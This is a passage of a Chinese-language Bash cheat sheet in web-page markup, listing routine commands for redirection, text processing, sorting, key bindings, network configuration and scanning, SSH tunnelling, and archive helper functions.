class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd1 | cmd2                        <span class="hljs-comment"># 管道，cmd1 的标准输出接到 cmd2 的标准输入</span><br>&lt; file                             <span class="hljs-comment"># 将文件内容重定向为命令的标准输入</span><br>&gt; file                             <span class="hljs-comment"># 将命令的标准输出重定向到文件，会覆盖文件</span><br>&gt;&gt; file                            <span class="hljs-comment"># 将命令的标准输出重定向到文件，追加不覆盖</span><br>&gt;| file                            <span class="hljs-comment"># 强制输出到文件，即便设置过：set -o noclobber</span><br>n&gt;| file                           <span class="hljs-comment"># 强制将文件描述符 n的输出重定向到文件</span><br>&lt;&gt; file                            <span class="hljs-comment"># 同时使用该文件作为标准输入和标准输出</span><br>n&lt;&gt; file                           <span class="hljs-comment"># 同时使用文件作为文件描述符 n 的输出和输入</span><br>n&gt; file                            <span class="hljs-comment"># 重定向文件描述符 n 的输出到文件</span><br>n&lt; file                            <span class="hljs-comment"># 重定向文件描述符 n 的输入为文件内容</span><br>n&gt;&amp;                                <span class="hljs-comment"># 将标准输出 dup/合并 到文件描述符 n</span><br>n&lt;&amp;                                <span class="hljs-comment"># 将标准输入 dump/合并 定向为描述符 n</span><br>n&gt;&amp;m                               <span class="hljs-comment"># 文件描述符 n 被作为描述符 m 的副本，输出用</span><br>n&lt;&amp;m                               <span class="hljs-comment"># 文件描述符 n 被作为描述符 m 的副本，输入用</span><br>&amp;&gt;file                             <span class="hljs-comment"># 将标准输出和标准错误重定向到文件</span><br>&lt;&amp;-                                <span class="hljs-comment"># 关闭标准输入</span><br>&gt;&amp;-                                <span class="hljs-comment"># 关闭标准输出</span><br>n&gt;&amp;-                               <span class="hljs-comment"># 关闭作为输出的文件描述符 n</span><br>n&lt;&amp;-                               <span class="hljs-comment"># 关闭作为输入的文件描述符 n</span><br>diff &lt;(cmd1) &lt;(cmd2)               <span class="hljs-comment"># 比较两个命令的输出</span><br><br></code></pre></td></tr></table></figure><h1 id="文本处理-cut"><a href="#文本处理-cut" class="headerlink" title="文本处理 - cut"></a>文本处理 - cut</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -c 1-16                        <span class="hljs-comment"># 截取每行头16个字符</span><br><span class="hljs-built_in">cut</span> -c 1-16 file                   <span class="hljs-comment"># 截取指定文件中每行头 16个字符</span><br><span class="hljs-built_in">cut</span> -c3-                           <span class="hljs-comment"># 截取每行从第三个字符开始到行末的内容</span><br><span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f5                      <span class="hljs-comment"># 截取用冒号分隔的第五列内容</span><br><span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;;&#x27;</span> -f2,10                   <span class="hljs-comment"># 截取用分号分隔的第二和第十列内容</span><br><span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f3-7                    <span class="hljs-comment"># 截取空格分隔的三到七列</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello&quot;</span> | <span class="hljs-built_in">cut</span> -c1-3           <span class="hljs-comment"># 显示 hel</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello sir&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f2   <span class="hljs-comment"># 显示 sir</span><br>ps | <span class="hljs-built_in">tr</span> -s <span class="hljs-string">&quot; &quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f 2,3,4  <span class="hljs-comment"># cut 搭配 tr 压缩字符</span><br></code></pre></td></tr></table></figure><h1 id="文本处理-awk-sed"><a href="#文本处理-awk-sed" class="headerlink" title="文本处理 - awk &#x2F; sed"></a>文本处理 - awk &#x2F; sed</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> file              <span class="hljs-comment"># 打印文件中以空格分隔的第五列</span><br>awk -F <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> file       <span class="hljs-comment"># 打印文件中以逗号分隔的第五列</span><br>awk <span class="hljs-string">&#x27;/str/ &#123;print $2&#125;&#x27;</span> file        <span class="hljs-comment"># 打印文件中包含 str 的所有行的第二列</span><br>awk -F <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> file      <span class="hljs-comment"># 打印逗号分隔的文件中的每行最后一列 </span><br>awk <span class="hljs-string">&#x27;&#123;s+=$1&#125; END &#123;print s&#125;&#x27;</span> file   <span class="hljs-comment"># 计算所有第一列的合</span><br>awk <span class="hljs-string">&#x27;NR%3==1&#x27;</span> file                 <span class="hljs-comment"># 从第一行开始，每隔三行打印一行</span><br><br>sed <span class="hljs-string">&#x27;s/find/replace/&#x27;</span> file         <span class="hljs-comment"># 替换文件中首次出现的字符串并输出结果 </span><br>sed <span class="hljs-string">&#x27;10s/find/replace/&#x27;</span> file       <span class="hljs-comment"># 替换文件第 10 行内容</span><br>sed <span class="hljs-string">&#x27;10,20s/find/replace/&#x27;</span> file    <span class="hljs-comment"># 替换文件中 10-20 行内容</span><br>sed -r <span class="hljs-string">&#x27;s/regex/replace/g&#x27;</span> file    <span class="hljs-comment"># 替换文件中所有出现的字符串</span><br>sed -i <span class="hljs-string">&#x27;s/find/replace/g&#x27;</span> file     <span class="hljs-comment"># 替换文件中所有出现的字符并且覆盖文件</span><br>sed -i <span class="hljs-string">&#x27;/find/i\newline&#x27;</span> file      <span class="hljs-comment"># 在文件的匹配文本前插入行</span><br>sed -i <span class="hljs-string">&#x27;/find/a\newline&#x27;</span> file      <span class="hljs-comment"># 在文件的匹配文本后插入行</span><br>sed <span class="hljs-string">&#x27;/line/s/find/replace/&#x27;</span> file   <span class="hljs-comment"># 先搜索行特征再执行替换</span><br>sed -e <span class="hljs-string">&#x27;s/f/r/&#x27;</span> -e <span class="hljs-string">&#x27;s/f/r&#x27;</span> file    <span class="hljs-comment"># 执行多次替换</span><br>sed <span class="hljs-string">&#x27;s#find#replace#&#x27;</span> file         <span class="hljs-comment"># 使用 # 替换 / 来避免 pattern 中有斜杆</span><br>sed -i -r <span class="hljs-string">&#x27;s/^\s+//g&#x27;</span> file         <span class="hljs-comment"># 删除文件每行头部空格</span><br>sed <span class="hljs-string">&#x27;/^$/d&#x27;</span> file                   <span class="hljs-comment"># 删除文件空行并打印</span><br>sed -i <span class="hljs-string">&#x27;s/\s\+$//&#x27;</span> file            <span class="hljs-comment"># 删除文件每行末尾多余空格</span><br>sed -n <span class="hljs-string">&#x27;2p&#x27;</span> file                   <span class="hljs-comment"># 打印文件第二行</span><br>sed -n <span class="hljs-string">&#x27;2,5p&#x27;</span> file                 <span class="hljs-comment"># 打印文件第二到第五行</span><br></code></pre></td></tr></table></figure><h1 id="排序-sort"><a href="#排序-sort" class="headerlink" title="排序 - sort"></a>排序 - sort</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> file                          <span class="hljs-comment"># 排序文件</span><br><span class="hljs-built_in">sort</span> -r file                       <span class="hljs-comment"># 反向排序（降序）</span><br><span class="hljs-built_in">sort</span> -n file                       <span class="hljs-comment"># 使用数字而不是字符串进行比较</span><br><span class="hljs-built_in">sort</span> -t: -k 3n /etc/passwd         <span class="hljs-comment"># 按 passwd 文件的第三列进行排序</span><br><span class="hljs-built_in">sort</span> -u file                       <span class="hljs-comment"># 去重排序</span><br><span class="hljs-built_in">sort</span> -h file                       <span class="hljs-comment"># 支持 K/M/G 等量级符号，可与 du 结合使用</span><br></code></pre></td></tr></table></figure><h1 id="快速跳转-https-github-com-rupa-z"><a href="#快速跳转-https-github-com-rupa-z" class="headerlink" title="快速跳转 - https://github.com/rupa/z"></a>快速跳转 - <a href="https://github.com/rupa/z">https://github.com/rupa/z</a></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> /path/to/z.sh               <span class="hljs-comment"># .bashrc 中初始化 z.sh</span><br>z                                  <span class="hljs-comment"># 列出所有历史路径以及他们的权重</span><br>z foo                              <span class="hljs-comment"># 跳到历史路径中匹配 foo 的权重最大的目录</span><br>z foo bar                          <span class="hljs-comment"># 跳到历史路径中匹配 foo 和 bar 权重最大的目录</span><br>z -l foo                           <span class="hljs-comment"># 列出所有历史路径中匹配 foo 的目录及权重</span><br>z -r foo                           <span class="hljs-comment"># 按照最高访问次数优先进行匹配跳转</span><br>z -t foo                           <span class="hljs-comment"># 按照最近访问优先进行匹配跳转</span><br></code></pre></td></tr></table></figure><h1 id="键盘绑定"><a href="#键盘绑定" class="headerlink" title="键盘绑定"></a>键盘绑定</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\eh&quot;:&quot;\C-b&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+h 为光标左移，同 CTRL+b / &lt;Left&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\el&quot;:&quot;\C-f&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+l 为光标右移，同 CTRL+f / &lt;Right&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\ej&quot;:&quot;\C-n&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+j 为下条历史，同 CTRL+n / &lt;Down&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\ek&quot;:&quot;\C-p&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+k 为上条历史，同 CTRL+p / &lt;Up&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\eH&quot;:&quot;\eb&quot;&#x27;</span>                 <span class="hljs-comment"># 绑定 ALT+H 为光标左移一个单词，同 ALT-b </span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\eL&quot;:&quot;\ef&quot;&#x27;</span>                 <span class="hljs-comment"># 绑定 ALT+L 为光标右移一个单词，同 ALT-f </span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\eJ&quot;:&quot;\C-a&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+J 为移动到行首，同 CTRL+a / &lt;Home&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\eK&quot;:&quot;\C-e&quot;&#x27;</span>                <span class="hljs-comment"># 绑定 ALT+K 为移动到行末，同 CTRL+e / &lt;End&gt;</span><br><span class="hljs-built_in">bind</span> <span class="hljs-string">&#x27;&quot;\e;&quot;:&quot;ls -l\n&quot;&#x27;</span>             <span class="hljs-comment"># 绑定 ALT+; 为执行 ls -l 命令</span><br></code></pre></td></tr></table></figure><h1 id="网络管理：ip-ifconfig-nmap-…"><a href="#网络管理：ip-ifconfig-nmap-…" class="headerlink" title="网络管理：ip &#x2F; ifconfig &#x2F; nmap …"></a>网络管理：ip &#x2F; ifconfig &#x2F; nmap …</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip a                               <span class="hljs-comment"># 显示所有网络地址，同 ip address</span><br>ip a show eth1                     <span class="hljs-comment"># 显示网卡 IP 地址</span><br>ip a add 172.16.1.23/24 dev eth1   <span class="hljs-comment"># 添加网卡 IP 地址</span><br>ip a del 172.16.1.23/24 dev eth1   <span class="hljs-comment"># 删除网卡 IP 地址</span><br>ip <span class="hljs-built_in">link</span> show dev eth0              <span class="hljs-comment"># 显示网卡设备属性</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 up                <span class="hljs-comment"># 激活网卡</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 down              <span class="hljs-comment"># 关闭网卡</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 address &#123;mac&#125;     <span class="hljs-comment"># 修改 MAC 地址</span><br>ip neighbour                       <span class="hljs-comment"># 查看 ARP 缓存</span><br>ip route                           <span class="hljs-comment"># 查看路由表</span><br>ip route add 10.1.0.0/24 via 10.0.0.253 dev eth0    <span class="hljs-comment"># 添加静态路由</span><br>ip route del 10.1.0.0/24           <span class="hljs-comment"># 删除静态路由</span><br><br>ifconfig                           <span class="hljs-comment"># 显示所有网卡和接口信息</span><br>ifconfig -a                        <span class="hljs-comment"># 显示所有网卡（包括开机没启动的）信息</span><br>ifconfig eth0                      <span class="hljs-comment"># 指定设备显示信息</span><br>ifconfig eth0 up                   <span class="hljs-comment"># 激活网卡</span><br>ifconfig eth0 down                 <span class="hljs-comment"># 关闭网卡</span><br>ifconfig eth0 192.168.120.56       <span class="hljs-comment"># 给网卡配置 IP 地址</span><br>ifconfig eth0 10.0.0.8 netmask 255.255.255.0 up     <span class="hljs-comment"># 配置 IP 并启动</span><br>ifconfig eth0 hw ether 00:aa:bb:cc:<span class="hljs-built_in">dd</span>:ee            <span class="hljs-comment"># 修改 MAC 地址</span><br><br>nmap 10.0.0.12                     <span class="hljs-comment"># 扫描主机 1-1000 端口</span><br>nmap -p 1024-65535 10.0.0.12       <span class="hljs-comment"># 扫描给定端口</span><br>nmap 10.0.0.0/24                   <span class="hljs-comment"># 给定网段扫描局域网内所有主机</span><br>nmap -O -sV 10.0.0.12              <span class="hljs-comment"># 探测主机服务和操作系统版本</span><br></code></pre></td></tr></table></figure><h1 id="有趣的命令"><a href="#有趣的命令" class="headerlink" title="有趣的命令"></a>有趣的命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">man hier                           <span class="hljs-comment"># 查看文件系统的结构和含义</span><br>man <span class="hljs-built_in">test</span>                           <span class="hljs-comment"># 查看 posix sh 的条件判断帮助</span><br>man ascii                          <span class="hljs-comment"># 显示 ascii 表</span><br>getconf LONG_BIT                   <span class="hljs-comment"># 查看系统是 32 位还是 64 位</span><br><span class="hljs-built_in">bind</span> -P                            <span class="hljs-comment"># 列出所有 bash 的快捷键</span><br>mount | column -t                  <span class="hljs-comment"># 漂亮的列出当前加载的文件系统</span><br>curl ip.cn                         <span class="hljs-comment"># 取得外网 ip 地址和服务商信息</span><br><span class="hljs-built_in">disown</span> -a &amp;&amp; <span class="hljs-built_in">exit</span>                  <span class="hljs-comment"># 关闭所有后台任务并退出</span><br><span class="hljs-built_in">cat</span> /etc/issue                     <span class="hljs-comment"># 查看 Linux 发行版信息</span><br>lsof -i port:80                    <span class="hljs-comment"># 哪个程序在使用 80 端口？</span><br>showkey -a                         <span class="hljs-comment"># 取得按键的 ASCII 码</span><br>svn diff | view -                  <span class="hljs-comment"># 使用 Vim 来显示带色彩的 diff 输出</span><br><span class="hljs-built_in">mv</span> filename.&#123;old,new&#125;              <span class="hljs-comment"># 快速文件改名</span><br>time <span class="hljs-built_in">read</span>                          <span class="hljs-comment"># 使用 CTRL-D 停止，最简单的计时功能</span><br><span class="hljs-built_in">cp</span> file.txt&#123;,.bak&#125;                 <span class="hljs-comment"># 快速备份文件</span><br>sudo <span class="hljs-built_in">touch</span> /forcefsck              <span class="hljs-comment"># 强制在下次重启时扫描磁盘</span><br>find ~ -mmin 60 -<span class="hljs-built_in">type</span> f            <span class="hljs-comment"># 查找 $HOME 目录中，60 分钟内修改过的文件</span><br>curl wttr.in/~beijing              <span class="hljs-comment"># 查看北京的天气预报</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;SSH_CLIENT%% *&#125;</span>             <span class="hljs-comment"># 取得你是从什么 IP 链接到当前主机上的</span><br><span class="hljs-built_in">echo</span> $[RANDOM%X+1]                 <span class="hljs-comment"># 取得 1 到 X 之间的随机数</span><br><span class="hljs-built_in">bind</span> -x <span class="hljs-string">&#x27;&quot;\C-l&quot;:ls -l&#x27;</span>             <span class="hljs-comment"># 设置 CTRL+l 为执行 ls -l 命令</span><br>find / -<span class="hljs-built_in">type</span> f -size +5M           <span class="hljs-comment"># 查找大于 5M 的文件</span><br><span class="hljs-built_in">chmod</span> --reference f1 f2            <span class="hljs-comment"># 将 f2 的权限设置成 f1 一模一样的</span><br>curl -L cheat.sh                   <span class="hljs-comment"># 速查表大全</span><br></code></pre></td></tr></table></figure><h1 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出最常使用的命令</span><br><span class="hljs-built_in">history</span> | awk <span class="hljs-string">&#x27;&#123;a[$2]++&#125;END&#123;for(i in a)&#123;print a[i] &quot; &quot; i&#125;&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span><br><br><span class="hljs-comment"># 列出所有网络状态：ESTABLISHED / TIME_WAIT / FIN_WAIT1 / FIN_WAIT2 </span><br>netstat -n | awk <span class="hljs-string">&#x27;/^tcp/ &#123;++tt[$NF]&#125; END &#123;for (a in tt) print a, tt[a]&#125;&#x27;</span><br><br><span class="hljs-comment"># 通过 SSH 来 mount 文件系统</span><br>sshfs name@server:/path/to/folder /path/to/mount/point<br><br><span class="hljs-comment"># 显示前十个运行的进程并按内存使用量排序</span><br>ps aux | <span class="hljs-built_in">sort</span> -nk +4 | <span class="hljs-built_in">tail</span><br><br><span class="hljs-comment"># 在右上角显示时钟</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">sleep</span> 1;<span class="hljs-keyword">do</span> tput sc;tput cup 0 $(($(tput cols)-<span class="hljs-number">29</span>));<span class="hljs-built_in">date</span>;tput rc;<span class="hljs-keyword">done</span>&amp;<br><br><span class="hljs-comment"># 从网络上的压缩文件中解出一个文件来，并避免保存中间文件</span><br>wget -qO - <span class="hljs-string">&quot;http://www.tarball.com/tarball.gz&quot;</span> | tar zxvf -<br><br><span class="hljs-comment"># 性能测试：测试处理器性能</span><br>python -c <span class="hljs-string">&quot;import test.pystone;print(test.pystone.pystones())&quot;</span><br><br><span class="hljs-comment"># 性能测试：测试内存带宽</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/null bs=1M count=32768<br><br><span class="hljs-comment"># Linux 下挂载一个 iso 文件</span><br>mount /path/to/file.iso /mnt/cdrom -oloop<br><br><span class="hljs-comment"># 通过主机 A 直接 ssh 到主机 B</span><br>ssh -t hostA ssh hostB<br><br><span class="hljs-comment"># 下载一个网站的所有图片</span><br>wget -r -l1 --no-parent -nH -nd -P/tmp -A<span class="hljs-string">&quot;.gif,.jpg&quot;</span> http://example.com/images<br><br><span class="hljs-comment"># 快速创建项目目录</span><br><span class="hljs-built_in">mkdir</span> -p work/&#123;project1,project2&#125;/&#123;src,bin,bak&#125;<br><br><span class="hljs-comment"># 按日期范围查找文件</span><br>find . -<span class="hljs-built_in">type</span> f -newermt <span class="hljs-string">&quot;2010-01-01&quot;</span> ! -newermt <span class="hljs-string">&quot;2010-06-01&quot;</span><br><br><span class="hljs-comment"># 显示当前正在使用网络的进程</span><br>lsof -P -i -n | <span class="hljs-built_in">cut</span> -f 1 -d <span class="hljs-string">&quot; &quot;</span>| <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">tail</span> -n +2<br><br><span class="hljs-comment"># Vim 中保存一个没有权限的文件</span><br>:w !sudo <span class="hljs-built_in">tee</span> &gt; /dev/null %<br><br><span class="hljs-comment"># 在 .bashrc / .bash_profile 中加载另外一个文件（比如你保存在 github 上的配置）</span><br><span class="hljs-built_in">source</span> ~/github/profiles/my_bash_init.sh<br><br><span class="hljs-comment"># 反向代理：将外网主机（202.115.8.1）端口（8443）转发到内网主机 192.168.1.2:443</span><br>ssh -CqTnN -R 0.0.0.0:8443:192.168.1.2:443  user@202.115.8.1<br><br><span class="hljs-comment"># 正向代理：将本地主机的 8443 端口，通过 192.168.1.3 转发到 192.168.1.2:443 </span><br>ssh -CqTnN -L 0.0.0.0:8443:192.168.1.2:443  user@192.168.1.3<br><br><span class="hljs-comment"># socks5 代理：把本地 1080 端口的 socks5 的代理请求通过远程主机转发出去</span><br>ssh -CqTnN -D localhost:1080  user@202.115.8.1<br><br><span class="hljs-comment"># 终端下正确设置 ALT 键和 BackSpace 键</span><br>http://www.skywind.me/blog/archives/2021<br></code></pre></td></tr></table></figure><h1 id="有用的函数"><a href="#有用的函数" class="headerlink" title="有用的函数"></a>有用的函数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 自动解压：判断文件后缀名并调用相应解压命令</span><br><span class="hljs-keyword">function</span> q-<span class="hljs-function"><span class="hljs-title">extract</span></span>() &#123;<br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$1</span> ] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span><br>        *.tar.bz2)   tar -xvjf <span class="hljs-variable">$1</span>    ;;<br>        *.tar.gz)    tar -xvzf <span class="hljs-variable">$1</span>    ;;<br>        *.tar.xz)    tar -xvJf <span class="hljs-variable">$1</span>    ;;<br>        *.bz2)       bunzip2 <span class="hljs-variable">$1</span>     ;;<br>        *.rar)       rar x <span class="hljs-variable">$1</span>       ;;<br>        *.gz)        gunzip <span class="hljs-variable">$1</span>      ;;<br>        *.tar)       tar -xvf <span class="hljs-variable">$1</span>     ;;<br>        *.tbz2)      tar -xvjf <span class="hljs-variable">$1</span>    ;;<br>        *.tgz)       tar -xvzf <span class="hljs-variable">$1</span>    ;;<br>        *.zip)       unzip <span class="hljs-variable">$1</span>       ;;<br>        *.Z)         uncompress <span class="hljs-variable">$1</span>  ;;<br>        *.7z)        7z x <span class="hljs-variable">$1</span>        ;;<br>        *)           <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;don&#x27;t know how to extract &#x27;<span class="hljs-variable">$1</span>&#x27;...&quot;</span> ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&#x27;<span class="hljs-variable">$1</span>&#x27; is not a valid file!&quot;</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-comment"># 自动压缩：判断后缀名并调用相应压缩程序</span><br><span class="hljs-keyword">function</span> q-<span class="hljs-function"><span class="hljs-title">compress</span></span>() &#123;<br>    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ] ; <span class="hljs-keyword">then</span><br>        FILE=<span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$FILE</span> <span class="hljs-keyword">in</span><br>        *.tar) <span class="hljs-built_in">shift</span> &amp;&amp; tar -cf <span class="hljs-variable">$FILE</span> $* ;;<br>        *.tar.bz2) <span class="hljs-built_in">shift</span> &amp;&amp; tar -cjf <span class="hljs-variable">$FILE</span> $* ;;<br>        *.tar.xz) <span class="hljs-built_in">shift</span> &amp;&amp; tar -cJf <span class="hljs-variable">$FILE</span> $* ;;<br>        *.tar.gz) <span class="hljs-built_in">shift</span> &amp;&amp; tar -czf <span class="hljs-variable">$FILE</span> $* ;;<br>        *.tgz) <span class="hljs-built_in">shift</span> &amp;&amp; tar -czf <span class="hljs-variable">$FILE</span> $* ;;<br>        *.zip) <span class="hljs-built_in">shift</span> &amp;&amp; zip <span class="hljs-variable">$FILE</span> $* ;;<br>        *.rar) <span class="hljs-built_in">shift</span> &amp;&amp; rar <span class="hljs-variable">$FILE</span> $* ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;usage: q-compress &lt;foo.tar.gz&gt; ./foo ./bar&quot;</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-comment"># 漂亮的带语法高亮的 color cat ，需要先 pip install pygments</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">ccat</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> style=<span class="hljs-string">&quot;monokai&quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -eq 0 ]; <span class="hljs-keyword">then</span><br>        pygmentize -P style=<span class="hljs-variable">$style</span> -P tabsize=4 -f terminal256 -g<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">for</span> NAME <span class="hljs-keyword">in</span> 